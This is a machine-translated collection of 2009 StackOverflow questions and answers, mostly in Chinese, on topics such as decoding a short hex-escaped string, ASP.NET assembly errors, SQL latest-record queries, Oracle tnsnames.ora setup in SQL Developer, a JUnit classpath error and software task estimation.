# StackOverflow 问答 000425000-000425999

# ascii - 如何解码此文本？

> ID：425009
> 
> 赞同：2
> 
> 时间：2009-01-08T16:50:54.610
> 
> 标签：ascii, escaping, decode

我有一个朋友在他的 wordpress 文件中有这样的代码：

> 块引用 \x66\x75\x6e\x63\x74\x69 块引用

等等...

我该如何解码？有没有在线工具可以做到这一点？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2009-01-08T16:54:23.043

该文本是一些十六进制字符的 ASCII 表示，您将如何对其进行解码将在很大程度上取决于您使用的编程语言。 [这是一个最近的十六进制到 ASCII 帖子的示例，可能会有所帮助](https://stackoverflow.com/questions/412954/converting-binary-data-to-printable-hex#412975)。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2009-01-08T16:56:57.593

您可以使用“Hex to ASCII”工具在线解码： [http ://www.yellowpipe.com/yis/tools/encrypter/index.php](http://www.yellowpipe.com/yis/tools/encrypter/index.php)

您不会粘贴“块引用”，而是粘贴块引用标签之间的所有内容。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2009-01-08T16:56:16.143

它只是十六进制......它转换为：“functi”

# asp.net - ASP.NET：WCF 并且无法加载文件或程序集“App_Web_hamznvwf

> ID：425015
> 
> 赞同：2
> 
> 时间：2009-01-08T16:53:06.400
> 
> 标签：asp.net, .net, wcf, caching, dynamic-compilation

我最近开始使用启用 AJAX 的 WCF，并且一直受到这个 .NET 缓存问题的困扰 -**无法加载文件或程序集 App__Web__hamznvwf**

我的服务器每天有 4 到 5 次出现此问题（Win 2003） - 请参阅[第一篇文章](https://stackoverflow.com/questions/401188/asp-net-error-could-not-load-file-or-assembly-appwebz9w33txs)

所以我将我的文件从服务器上移开并开始在本地运行项目（Win XP）。啊！问题再次出现 -**本地**。它发生在重新启动后！您认为这是在我的本地计算机和服务器上导致此问题的网络策略吗？我想我会尝试 向所有人打开
C:\WINDOWS\Microsoft.NET\Framework\v2.0.50727\Temporary ASP.NET Files 。
看看这是否有帮助？

在致电 MS Support 之前，我还应该尝试什么其他事情？

如何在 ASP.NET 临时文件中删除我的“AppNameFolder”？我以为我可以关闭内置的调试网络服务器，就是这样。有些东西阻止我删除它。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2009-02-02T18:49:22.220

哇，这个有点牛逼。我做了一些研究，显然很多人多年来一直在经历这个问题。您可能正在缓存网站中定义的类型。此类类型没有程序集，因此在运行时为它们随机生成一个。下次你回收你的 web 服务器时，你的类型会得到一个不同的随机生成的程序集，并且你的缓存将无法反序列化，因为旧的程序集不再存在。您可以尝试以下一些可能的修复方法：

*   在单独的程序集中而不是在您的网站中定义所有类型。
*   在您的本地机器上，查看在 webdev 而不是 iis 中运行该站点是否具有相同的行为。
*   如果您使用的是进程外 (SQL Server) 会话/缓存存储，请尝试使用进程内（本地内存中）会话/缓存存储
*   删除 C:\WINDOWS\Microsoft.NET\Framework\v2.0.50727\Temporary ASP.NET Files 下的所有子目录（正如 Dimi 提到的，使用 Unlocker 来打破任何应用程序可能拥有的锁定）
*   如果您在部署时预编译您的网站，请确保在部署之前关闭您的 Web 服务器。（显然，如果用户在旧版本的网站上请求页面，那么在部署新版本时它会搞砸。）

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2009-01-09T18:07:18.583

您是否尝试过[禁用索引服务](http://www.shahine.com/omar/WindowsIndexingServiceASPNETCannotDebug.aspx)？此外，转移到[Web 应用程序项目](http://msdn.microsoft.com/en-us/library/aa730880(VS.80).aspx#wapp_topic5)并查看此问题是否仍然存在可能是值得的。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2009-01-11T11:36:53.440

除了上一张海报所说的，我建议使用这样的工具 [来](http://www.emptyloop.com/unlocker/)确定问题所在。

# asp.net - Debugging w/ Attach to Process Starts ASP.NET Dev Server

> ID：425016
> 
> 赞同：15
> 
> 时间：2009-01-08T16:53:14.387
> 
> 标签：asp.net, visual-studio, debugging, iis

I'm developing an ASP.NET site off of my Windows XP IIS Installation, and whenever I tell visual studio to attach-to-process to the aspnet_wp.exe it starts a new instance of asp.net development server. Is there a way to make it not start asp.net development server since I don't need it to launch anything?

* * *

## 回答 #1

> 赞同：20
> 
> 时间：2010-06-19T07:48:31.667

如果您想关闭它，您只需更改项目文件上的设置（使用 f4 显示属性网格）。有一个选项显示**Always Start When Debugging**，将其设置为 false 就可以了。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2009-01-08T17:03:03.680

If you right-click the web project and select Properties, there is a Web tab. On there you can select the Server to use when debugging, by default it is set to the Visual Studio Development Server. You probably want to use the **Local IIS Web Server** instead.

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2009-01-08T16:59:24.967

If you want to attach to the IIS worker process then you need to attach to `w3wp.exe`.

# java - Apache ServiceMix 入门指南

> ID：425017
> 
> 赞同：11
> 
> 时间：2009-01-08T16:53:30.707
> 
> 标签：java, documentation, apache-servicemix

开始使用 Apache ServiceMix 的权威指南是什么？网站上的操作方法和指南过于复杂，无法从头开始。

* * *

## 回答 #1

> 赞同：10
> 
> 时间：2009-01-08T19:01:11.400

我自己还在学习 Apache ServiceMix。ESB 通常非常复杂。我找到的最好的书是Manning 出版的“ [Open-Source ESBs in Action ”。](https://rads.stackoverflow.com/amzn/click/com/1933988215)它运行 MVN/ANT 来设置您的环境，并通过一些非常基本的示例引导您完成。让我知道你有多喜欢它。

* * *

## 回答 #2

> 赞同：8
> 
> 时间：2010-08-20T22:15:26.960

这里有一些关于建立开发环境的快速说明以及这里对 Servicemix4 的介绍......

[http://benoday.blogspot.com/2010/08/fuse-esb-42-and-osgi-quick-start-guide.html](http://benoday.blogspot.com/2010/08/fuse-esb-42-and-osgi-quick-start-guide.html)

[http://benoday.blogspot.com/2010/08/servicemix-developer-machine-setup.html](http://benoday.blogspot.com/2010/08/servicemix-developer-machine-setup.html)

* * *

## 回答 #3

> 赞同：4
> 
> 时间：2009-09-02T14:46:39.063

我喜欢 DZone 的六页参考卡，可以在[这里](http://refcardz.dzone.com/refcardz/getting-started-servicemix-40)找到。上面有很多信息。

您可以在线阅读，或将下载链接通过电子邮件发送给您。

祝你好运！

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-08-09T17:07:03.847

[此处](http://refcardz.dzone.com/refcardz/servicemix)更新 4.2 版

# sql - SQL 按 ID 区分和按日期最新

> ID：425020
> 
> 赞同：1
> 
> 时间：2009-01-08T16:55:10.653
> 
> 标签：sql, tfs, reporting-services

我有以下 SQL 语句。我需要使用 System.RevisedDate 为每个 System.Id 选择最新记录

```
SELECT     [System.Id],[System.RevisedDate], [System.Title], [System.State], [System.Reason], [System.CreatedDate], [System.WorkItemType], [System.TeamProject], 
                      [Microsoft.VSTS.Scheduling.RemainingWork], [Microsoft.VSTS.Scheduling.CompletedWork], [Microsoft.VSTS.CMMI.Estimate]
FROM         WorkItems
WHERE     ([System.WorkItemType] = 'Change Request') AND ([System.CreatedDate] >= '09/30/2008') AND ([System.TeamProject] NOT LIKE '%Deleted%') AND 
                      ([System.TeamProject] NOT LIKE '%Sandbox%') 
```

你能帮忙吗？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2009-01-08T17:05:19.027

试试这个：

```
SELECT * FROM WorkItems w
JOIN (
SELECT     [System.Id],MAX([System.RevisedDate])
FROM WorkItems
WHERE ([System.WorkItemType] = 'Change Request') 
AND ([System.CreatedDate] >= '09/30/2008') 
AND ([System.TeamProject] NOT LIKE '%Deleted%') 
AND ([System.TeamProject] NOT LIKE '%Sandbox%')
GROUP BY {System.Id]
) x ON w.[System.Id] = x.[System.Id] AND w.[System.DateRevised] = x.[System.DateRevised] 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2009-01-08T17:01:42.607

一般来说，它应该像这样

```
SELECT ID,DATE_FIELD,FIELD1,FIELD2
FROM TBL1 AS A WHERE DATE_FIELD >= ALL (
   SELECT DATE_FIELD FROM TBL1 AS B
   WHERE A.ID = B.ID 
) 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2009-01-08T17:03:27.347

或者，（使用子查询）

```
SELECT ID,DATE_FIELD,FIELD1,FIELD2
FROM TBL1 T
Where DATE_FIELD = 
    (Select Max(Date_Field) From Tbl1 
     Where Id = T.Id) 
```

但我无法破译您的示例查询......“系统”是一个表吗？为什么 Select 子句中没有对 WorkItem 的引用？好像不合拍。。。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2009-01-08T17:05:52.537

尝试

```
SELECT [System.Id],[System.RevisedDate], [System.Title], [System.State], [System.Reason], [System.CreatedDate], [System.WorkItemType], [System.TeamProject], 
[Microsoft.VSTS.Scheduling.RemainingWork], [Microsoft.VSTS.Scheduling.CompletedWork], [Microsoft.VSTS.CMMI.Estimate]
FROM         WorkItems
Left JOIN (Select [System.Id],Max([System.RevisedDate]) group by [System.Id]) LatestItems
    on Workitems.[System.Id] = LatestItems.[System.Id] and 
    Workitems.[System.RevisedDate] = LatestItems.[System.RevisedDate]
    WHERE     
([System.WorkItemType] = 'Change Request') AND ([System.CreatedDate] >= '09/30/2008') AND ([System.TeamProject] NOT LIKE '%Deleted%') AND 
                          ([System.TeamProject] NOT LIKE '%Sandbox%') 
```

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2009-01-08T17:07:27.167

我喜欢亚历克斯的回答，但我想我会提出另一种可能性。对不起，没有机会测试它。:-)

```
SELECT     WorkItems.[System.Id], WorkItems.[System.RevisedDate], [System.Title], [System.State],     [System.Reason], [System.CreatedDate], [System.WorkItemType], [System.TeamProject], 
                  [Microsoft.VSTS.Scheduling.RemainingWork], [Microsoft.VSTS.Scheduling.CompletedWork], [Microsoft.VSTS.CMMI.Estimate]
FROM         WorkItems join (SELECT     [System.Id],max([System.RevisedDate]) [MaxDate]
                         FROM         WorkItems
                         WHERE     ([System.WorkItemType] = 'Change Request') AND ([System.CreatedDate] >= '09/30/2008') AND ([System.TeamProject] NOT LIKE '%Deleted%') AND 
                         ([System.TeamProject] NOT LIKE '%Sandbox%')
                         group by [System.Id]) MaxDates
on  WorkItems.[System.Id] = MaxDates.[System.Id]
and WorkItems.[System.RevisedDate] = MaxDates.[MaxDate] 
```

# oracle - TOAD 与 AquaFold - 连接到 Oracle

> ID：425025
> 
> 赞同：1
> 
> 时间：2009-01-08T16:56:24.130
> 
> 标签：oracle, toad, aquafold

有没有人有使用这两种产品的经验并愿意分享每种产品的优缺点？我喜欢 TOAD，但我要迁移到 Mac，所以我必须放弃它。我总是可以在 VM 中运行 TOAD，但同时我想尝试一些新的和原生的 Mac OS。Toad 是一个记忆猪，经常崩溃，所以如果我能找到任何具有相似功能且更稳定的东西，我不会介意这种变化。

我特别关心代码完成（类似 Intellisense）、代码格式化、SVN 集成和通常的模式浏览、速度。蟾蜍速度很快，这是我非常喜欢它的一件事。

谢谢！

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2009-01-08T17:13:56.047

你试过 Sql Developer 吗？您可以在 Oracle 网站上免费下载：[http ://www.oracle.com/technology/software/products/sql/index.html](http://www.oracle.com/technology/software/products/sql/index.html)

# database - 向 SQL Developer 添加新连接时不显示 Oracle TNS 名称

> ID：425029
> 
> 赞同：96
> 
> 时间：2009-01-08T16:57:43.613
> 
> 标签：database, oracle, oracle-sqldeveloper, tnsnames, tns

我正在尝试使用 SQL Developer 连接到 Oracle 数据库。

我已经安装了 .Net oracle 驱动程序并将`tnsnames.ora`文件放在
`C:\Oracle\product\11.1.0\client_1\Network\Admin`

我在 tnsnames.ora 中使用以下格式：

```
dev =
  (DESCRIPTION =
    (ADDRESS = (PROTOCOL = TCP)(HOST = 192.168.XXX.XXX)(PORT = XXXX))
    (CONNECT_DATA =
      (SERVER = DEDICATED)
      (SERVICE_NAME = idpdev2)
    )
  ) 
```

在 SQL Developer 中，当我尝试创建新连接时，没有 TNS 名称显示为选项。

有什么我想念的吗？

* * *

## 回答 #1

> 赞同：179
> 
> 时间：2009-01-08T17:17:32.887

SQL Developer 将按此顺序在以下位置查找 tnsnames.ora 文件

1.  $HOME/.tnsnames.ora
2.  $TNS_ADMIN/tnsnames.ora
3.  注册表中的 TNS_ADMIN 查找键
4.  /etc/tnsnames.ora（非windows）
5.  $ORACLE_HOME/network/admin/tnsnames.ora
6.  LocalMachine\SOFTWARE\ORACLE\ORACLE_HOME_KEY
7.  本地机器\软件\ORACLE\ORACLE_HOME

`show tns`要查看哪个 SQL Developer 正在使用，请在工作表中发出命令

如果您的 tnsnames.ora 文件未被识别，请使用以下过程：

1.  定义一个名为*TNS_ADMIN*的环境变量以指向包含 tnsnames.ora 文件的文件夹。

    在 Windows 中，这是通过导航到*控制面板*>*系统*>*高级系统设置*>*环境变量...*

    在 Linux 中，在主目录的 .profile 文件中定义*TNS_ADMIN变量。*

2.  确认操作系统正在识别此环境变量

    从 Windows 命令行：echo %TNS_ADMIN%

    来自 linux：回声 $TNS_ADMIN

3.  重新启动 SQL 开发人员

4.  现在在 SQL Developer 中右键单击*Connections*并选择*New Connection...*。在下拉框中选择*TNS作为连接类型。*您来自 tnsnames.ora 的条目现在应该显示在此处。

* * *

## 回答 #2

> 赞同：32
> 
> 时间：2011-08-09T23:18:44.600

打开 SQL 开发人员。转到工具 -> 首选项 -> 数据库 -> 高级 然后显式设置 Tnsnames 目录

我的 TNSNAMES 设置正确，我可以连接到 Toad、SQL*Plus 等，但我需要这样做才能让 SQL Developer 工作。也许这是 Win 7 的问题，因为安装起来也很痛苦。

* * *

## 回答 #3

> 赞同：16
> 
> 时间：2009-01-08T19:56:13.503

您始终可以通过运行 TNSPING 检查连接性（9i 或更高版本）找到正在使用的 tnsnames.ora 文件的位置：

```
C:\>tnsping dev

TNS Ping Utility for 32-bit Windows: Version 10.2.0.1.0 - Production on 08-JAN-2009 12:48:38

Copyright (c) 1997, 2005, Oracle.  All rights reserved.

Used parameter files:
C:\oracle\product\10.2.0\client_1\NETWORK\ADMIN\sqlnet.ora

Used TNSNAMES adapter to resolve the alias
Attempting to contact (DESCRIPTION = (ADDRESS = (PROTOCOL = TCP)(HOST = XXX)(PORT = 1521)) (CONNECT_DATA = (SERVICE_NAME = DEV)))
OK (30 msec)

C:\> 
```

有时，问题在于您在 tnsnames.ora 中所做的条目，而不是系统找不到它。也就是说，我同意设置 tns_admin 环境变量是一件好事，因为它避免了在确定在具有多个 oracle home 的系统中准确使用哪个 tnsnames 文件时出现的不可避免的问题。

* * *

## 回答 #4

> 赞同：16
> 
> 时间：2012-07-23T12:33:48.047

在**SQLDeveloper**中浏览`Tools --> Preferences`，如下图所示。

![在此处输入图像描述](https://i.stack.imgur.com/28b8A.png)

在**tnsnames.ora**所在的**Preferences**选项中。然后点击**确定**。 如下图所示。`expand Database --> select Advanced --> under "Tnsnames Directory" --> Browse the directory`

 ****![在此处输入图像描述](https://i.stack.imgur.com/IgzUW.png)

> **你已经完成了！**

现在您可以通过**TNSnames**选项进行连接。

* * *

## 回答 #5

> 赞同：2
> 
> 时间：2010-04-13T22:30:26.580

Jason 提到的步骤非常好，应该可以工作。不过，SQL Developer 有一点点变化。它在第一次读取 tnsnames.ora 文件时缓存连接规范（主机、服务名称、端口）。然后，当从 tnsname.ora 文件中删除原始条目时，它不会使规范无效。即使 SQL Developer 已终止并重新启动，缓存仍然存在。这不是处理这种情况的不合逻辑的方式。即使 tnsnames.ora 文件暂时不可用，只要原始规范仍然正确，SQL Developer 仍然可以建立连接。问题在于他们的下一个小转折。在解析连接时，SQL Developer 将 tnsnames.ora 文件中的服务名称视为区分大小写的值。因此，如果您曾经有一个条目名称 ABCD。文件中的世界，并且您将其替换为名为 abcd.world 的新条目，SQL Developer 不会更新其 ABCD.world 的连接规范 - 它将完全将 abcd.world 视为不同的连接。为什么 Oracle 产品会将 oracle 开发的明确不区分大小写的文件格式的内容视为区分大小写，我对此并不感到惊讶？

* * *

## 回答 #6

> 赞同：1
> 
> 时间：2012-05-22T14:16:12.393

在Sql Developer中，导航到Tools->preferences->Datababae->advanced->Set Tnsname directory为包含tnsnames.ora的目录

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2014-03-24T19:42:52.977

上述更改都没有对我的情况产生任何影响。我可以在命令窗口中运行 TNS_PING，但 SQL Developer 无法确定 tnsnames.ora 的位置。

我的问题（Windows 7 - 64 bit - Enterprise）是 Oracle 安装程序将开始菜单快捷方式指向错误版本的 SQL Developer。安装程序似乎附带了三个 SQL Developer 实例。一个在 %ORACLE_HOME%\client_1\sqldeveloper\ 中，两个在 %ORACLE_HOME%\client_1\sqldeveloper\bin\ 中。

安装程序安装了一个开始菜单快捷方式，该快捷方式指向 bin 目录中根本不起作用的版本。每次我启动 SQL Developer 时它都会要求输入密码，当我选择 TNS 作为连接机制时，它不记得我所做的选择并显示一个空白列表。它也没有其他帖子中引用的数据库高级设置中的 TNS 目录字段。

我扔掉了旧的 Start 快捷方式并安装了 %ORACLE_HOME%\client_1\sqldeveloper\sqldeveloper.exe 的快捷方式。这种变化解决了我的问题。

# emulation - 有没有DV模拟器之类的东西？

> ID：425035
> 
> 赞同：2
> 
> 时间：2009-01-08T16:59:53.640
> 
> 标签：emulation

是否存在出于开发目的模拟 DV 摄像机的软件？（这样您就可以测试可以从 miniDV 摄像机捕获视频并控制 miniDV 摄像机的应用程序，而无需拥有 miniDV 摄像机。）

谷歌搜索显示 Apple 的 Firewire SDK 有一个叫做 VirtualDV 的东西。XP有什么可用的吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2009-01-08T17:18:42.200

您可以购买非常便宜的设备，将任何 RGB 输入转换为 USB，如果这是您所追求的，我为此使用了[Dazzle 转换器。](http://www.pinnaclesys.com/PublicSite/us/Products/Consumer+Products/Dazzle/)不完全确定这是否是您所追求的。

# java - 创建 JUnit 测试时没有此类方法错误

> ID：425039
> 
> 赞同：12
> 
> 时间：2009-01-08T17:00:43.747
> 
> 标签：java, hibernate, spring, junit, netbeans6.5

在过去的两天里，我一直在尝试解决这个问题，但没有成功。我只是尝试使用 spring 框架和 hibernate 创建一个基于注释的 JUnit 测试。

我的 IDE 是 netbeans 6.5，我使用的是 hibernate 3、spring 2.5.5 和 JUnit 4.4。

这是我得到的错误：

```
Testcase: testFindContacts(com.mycontacts.data.dao.MyContactHibernateDaoTransactionTest):        Caused an ERROR
Failed to load ApplicationContext
java.lang.IllegalStateException: Failed to load ApplicationContext
        at org.springframework.test.context.TestContext.getApplicationContext(TestContext.java:203)
        at org.springframework.test.context.support.DependencyInjectionTestExecutionListener.injectDependencies(DependencyInjectionTestExecutionListener.java:109)
        at org.springframework.test.context.support.DependencyInjectionTestExecutionListener.prepareTestInstance(DependencyInjectionTestExecutionListener.java:75)
        at org.springframework.test.context.TestContextManager.prepareTestInstance(TestContextManager.java:255)
        at org.springframework.test.context.junit4.SpringJUnit4ClassRunner.createTest(SpringJUnit4ClassRunner.java:93)
        at org.springframework.test.context.junit4.SpringJUnit4ClassRunner.invokeTestMethod(SpringJUnit4ClassRunner.java:130)
Caused by: org.springframework.beans.factory.BeanCreationException: Error creating bean with name 'sessionFactory' defined in class path resource [shared-context.xml]: Invocation of init method failed; nested exception is java.lang.NoSuchMethodError: org.objectweb.asm.ClassWriter.<init>(I)V
        at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.initializeBean(AbstractAutowireCapableBeanFactory.java:1337)
        at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.doCreateBean(AbstractAutowireCapableBeanFactory.java:473)
        at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory$1.run(AbstractAutowireCapableBeanFactory.java:409)
        at java.security.AccessController.doPrivileged(Native Method)
        at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.createBean(AbstractAutowireCapableBeanFactory.java:380)
        at org.springframework.beans.factory.support.AbstractBeanFactory$1.getObject(AbstractBeanFactory.java:264)
        at org.springframework.beans.factory.support.DefaultSingletonBeanRegistry.getSingleton(DefaultSingletonBeanRegistry.java:221)
        at org.springframework.beans.factory.support.AbstractBeanFactory.doGetBean(AbstractBeanFactory.java:261)
        at org.springframework.beans.factory.support.AbstractBeanFactory.getBean(AbstractBeanFactory.java:185)
        at org.springframework.beans.factory.support.AbstractBeanFactory.getBean(AbstractBeanFactory.java:164)
        at org.springframework.beans.factory.support.DefaultListableBeanFactory.preInstantiateSingletons(DefaultListableBeanFactory.java:423)
        at org.springframework.context.support.AbstractApplicationContext.finishBeanFactoryInitialization(AbstractApplicationContext.java:729)
        at org.springframework.context.support.AbstractApplicationContext.refresh(AbstractApplicationContext.java:381)
        at org.springframework.test.context.support.AbstractGenericContextLoader.loadContext(AbstractGenericContextLoader.java:84)
        at org.springframework.test.context.support.AbstractGenericContextLoader.loadContext(AbstractGenericContextLoader.java:42)
        at org.springframework.test.context.TestContext.loadApplicationContext(TestContext.java:173)
        at org.springframework.test.context.TestContext.getApplicationContext(TestContext.java:199)
Caused by: java.lang.NoSuchMethodError: org.objectweb.asm.ClassWriter.<init>(I)V
        at net.sf.cglib.core.DebuggingClassWriter.<init>(DebuggingClassWriter.java:47)
        at net.sf.cglib.core.DefaultGeneratorStrategy.getClassWriter(DefaultGeneratorStrategy.java:30)
        at net.sf.cglib.core.DefaultGeneratorStrategy.generate(DefaultGeneratorStrategy.java:24)
        at net.sf.cglib.core.AbstractClassGenerator.create(AbstractClassGenerator.java:216)
        at net.sf.cglib.core.KeyFactory$Generator.create(KeyFactory.java:144)
        at net.sf.cglib.core.KeyFactory.create(KeyFactory.java:116)
        at net.sf.cglib.core.KeyFactory.create(KeyFactory.java:108)
        at net.sf.cglib.core.KeyFactory.create(KeyFactory.java:104)
        at net.sf.cglib.proxy.Enhancer.<clinit>(Enhancer.java:69)
        at org.hibernate.proxy.pojo.cglib.CGLIBLazyInitializer.getProxyFactory(CGLIBLazyInitializer.java:117)
        at org.hibernate.proxy.pojo.cglib.CGLIBProxyFactory.postInstantiate(CGLIBProxyFactory.java:43)
        at org.hibernate.tuple.entity.PojoEntityTuplizer.buildProxyFactory(PojoEntityTuplizer.java:162)
        at org.hibernate.tuple.entity.AbstractEntityTuplizer.<init>(AbstractEntityTuplizer.java:135)
        at org.hibernate.tuple.entity.PojoEntityTuplizer.<init>(PojoEntityTuplizer.java:55)
        at org.hibernate.tuple.entity.EntityEntityModeToTuplizerMapping.<init>(EntityEntityModeToTuplizerMapping.java:56)
        at org.hibernate.tuple.entity.EntityMetamodel.<init>(EntityMetamodel.java:295)
        at org.hibernate.persister.entity.AbstractEntityPersister.<init>(AbstractEntityPersister.java:434)
        at org.hibernate.persister.entity.SingleTableEntityPersister.<init>(SingleTableEntityPersister.java:109)
        at org.hibernate.persister.PersisterFactory.createClassPersister(PersisterFactory.java:55)
        at org.hibernate.impl.SessionFactoryImpl.<init>(SessionFactoryImpl.java:226)
        at org.hibernate.cfg.Configuration.buildSessionFactory(Configuration.java:1294)
        at org.hibernate.cfg.AnnotationConfiguration.buildSessionFactory(AnnotationConfiguration.java:859)
        at org.springframework.orm.hibernate3.LocalSessionFactoryBean.newSessionFactory(LocalSessionFactoryBean.java:814)
        at org.springframework.orm.hibernate3.LocalSessionFactoryBean.buildSessionFactory(LocalSessionFactoryBean.java:732)
        at org.springframework.orm.hibernate3.AbstractSessionFactoryBean.afterPropertiesSet(AbstractSessionFactoryBean.java:211)
        at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.invokeInitMethods(AbstractAutowireCapableBeanFactory.java:1368)
        at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.initializeBean(AbstractAutowireCapableBeanFactory.java:1334) 
```

* * *

## 回答 #1

> 赞同：24
> 
> 时间：2009-01-08T17:29:47.903

`java.lang.NoSuchMethodError`总是表示编译器类路径上的类版本与运行时类路径上的类版本不同（如果在编译时缺少该方法，编译将失败。）

在这种情况下，您`org.objectweb.asm.ClassWriter`在编译时的类路径中的版本与运行时类路径中的版本不同。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2009-01-08T21:53:03.503

绝对你在运行时有不同版本的 ClassWriter 类而不是编译时。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2009-01-08T17:15:32.783

我认为您在用于测试的类路径中的某处选择了不正确的 asm.jar 版本。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2009-02-28T22:05:32.143

我在 NetBeans 6.5 上使用带有 Hibernate 的 Spring 2.5 时遇到了类似的错误。我解决该问题的一种方法是下载 Spring 3.0 M2 并使用发行版中的 jar 创建一个名为 Spring_3 的 NetBeans 库。该库还必须包含 antlr-runtime-3.0.jar。

见： http: [//forum.springsource.org/showthread.php?t=65324](http://forum.springsource.org/showthread.php?t=65324)

-狮子座

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2014-09-13T02:18:27.713

我想向任何遇到此 JUnit Testing for Android 的人分享我的建议；以上都不适合我，这是一个简单的修复：

`Eclipse>>project properties>>Android>>`确保您正在测试的项目在库下被引用。'is library' 可以保持未选中状态

# estimation - 如果您没有经验，如何估算编程任务

> ID：425044
> 
> 赞同：105
> 
> 时间：2009-01-08T17:02:05.820
> 
> 标签：estimation

我很难与管理层要求对使用我之前没有经验的第三方控件的编程任务进行估算。

我绝对理解他们为什么想要估算，但我觉得我给出的任何估算要么a）太短，让我看起来很糟糕，要么b）太长，让我看起来很糟糕。

我可以给管理层什么样的估计或答复来让他们摆脱我的支持，以便我可以继续工作！

* * *

## 回答 #1

> 赞同：93
> 
> 时间：2009-01-08T17:05:43.443

您可以给出的最佳答案是要求时间来敲出一个快速原型，以便您给出更准确的估计。如果没有使用工具或问题*的*经验，您给出的任何估计基本上都是没有意义的。

顺便说一句，给出太长的估计很少有问题。出现意想不到的问题，优先级改变，需求被“更新”。即使你不使用你要求的所有时间，你也会有更多的测试时间，或者可以“提前”发布。

我的估计总是过于乐观，这会给你的生活带来很大的压力，尤其是当你是一个没有经验和自信告诉老板不舒服的真相的年轻程序员时。

* * *

## 回答 #2

> 赞同：40
> 
> 时间：2009-01-08T17:13:05.563

我会让你知道一个秘密。即使您是该技术的专家，您的估计也可能非常不准确。当做一些天生的研发任务时，这是野兽的本性。不幸的是，管理层经常试图应用制造模型并要求准确的估计。为了说明我的观点，请考虑准确估计以下两项努力的难度：

A) 再制造 11K 雨伞，与您上个月生产的 2K 雨伞完全相同。B) 设计一种新型雨伞并制作第一把。

软件开发是 B，但他们要求假设 A 的估计。

你能做的最好的事情是将任务分解成尽可能小的部分（每个不超过 1/2 天），然后将你想出的最终数字增加三倍。（Spolsky 方法）

或者，Steve McConnell 有一整本书（可以说是几本书）关于软件工程的这一方面。 [http://www.amazon.com/Software-Estimation-Demystifying-Practices-Microsoft/dp/0735605351](https://rads.stackoverflow.com/amzn/click/com/0735605351)

* * *

## 回答 #3

> 赞同：32
> 
> 时间：2009-01-08T17:10:01.467

[Steve McConnell](http://cc2e.com/)（和其他人）谈到了[不确定性的锥体](http://www.construx.com/Page.aspx?hid=1648)。基本上，您提供的估计看起来像这样：

这项工作需要 3 到 9 周，最有可能的是 4 周。

随着项目的进展，您可以细化您的估算。随着您完成更多工作并更好地了解所需的工作，您可以改进您的估计以更准确。

它对我有用，但可能需要一些努力才能让项目中的其他利益相关者了解该过程。

* * *

## 回答 #4

> 赞同：13
> 
> 时间：2009-01-08T17:36:02.367

您可能要考虑同时给出估计值和置信水平，即 50/50 表示需要 3-6 个月或 6-9 个月或 75% 的机会在 9 个月内完成，90% 的可能性是一年内完成。

您可能要考虑的另一件事是使用“[群体智慧](http://en.wikipedia.org/wiki/The_Wisdom_of_Crowds)”的方法。四处走走，问 25-50 个人他们认为需要多长时间，然后平均他们的估计。我认为Mike Cohn 的[Planning Poker](http://www.planningpoker.com/)与此非常相似，尽管很难仅由一个开发人员进行计划。

* * *

## 回答 #5

> 赞同：12
> 
> 时间：2009-01-08T17:21:51.083

将您的估计分解为：

*   **已知的**；做你知道该怎么做的事情需要多长时间。您应该能够以高度的信心给出这个估计。
*   **已知的未知数**；你认为做你不知道怎么做的事情需要多长时间。您可以使用 dacracot 之类的方法对该估计值给出不同程度的置信度。
*   **未知的未知数**；这是实时黑洞。这些是在最不合时宜的时候出现并咬你屁股的东西。根据您预期的风险提供估算范围，并说明理由。

提议在此过程中调整估计和某些里程碑。任何未知的未知都将成为已知的未知，随着您获得经验，已知的未知应该成为已知的已知，并且您对已知已知的估计可以根据迄今为止的进展进行调整。您可以进行初步估算，然后在完成大约 25% 时重新估算，然后再次估算为 50%，然后再次估算为 85%。在每个里程碑，您的估计应该开始收敛于任务将花费的实际时间。

* * *

## 回答 #6

> 赞同：8
> 
> 时间：2009-01-08T17:09:05.743

我对我的估计使用了明确的标签系统……A 类、B 类和 C 类。

C类估计是他们得到的第一个。由于未知，它公开表示为正负 50%。如果他们想让我继续给他们B级，那么我需要钱来研究。

B类为正负25%。有时这已经足够好了，他们给了我建造的钱。如果没有，更少的钱和更多的研究。

A类是正负10%，最终和go or no go。如果这是一次尝试，而我与估计相差太远，我会经常和早日承认。

* * *

## 回答 #7

> 赞同：8
> 
> 时间：2009-01-08T17:11:37.783

我认为，如果您删除“使用我之前没有经验的第 3 方控件”的短语，您可能会对更大的问题有更好的描述。

如果“敏捷”教会了我们什么，那就是，如果管理层希望你持续地以这种方式估计项目，如果你说因为没有能力而无法提供，你会“看起来很糟糕”足够的信息，你在高速公路上失败。

最大的问题将是您无法控制的问题，甚至还没有发现。你有多少次回头对自己说：“好吧，我在第三次尝试时按了我的估计，在我发现......并且我需要版本......并且 dba 将开启一个星期的假期，项目经理需要我……一个星期，我的妻子怀孕了……”。

我会非常努力地说，“我可以确定关键的风险因素，并提出一份可交付成果清单，以便在 xx 天内对其进行测试。届时，我会给你另一个增量估计。”

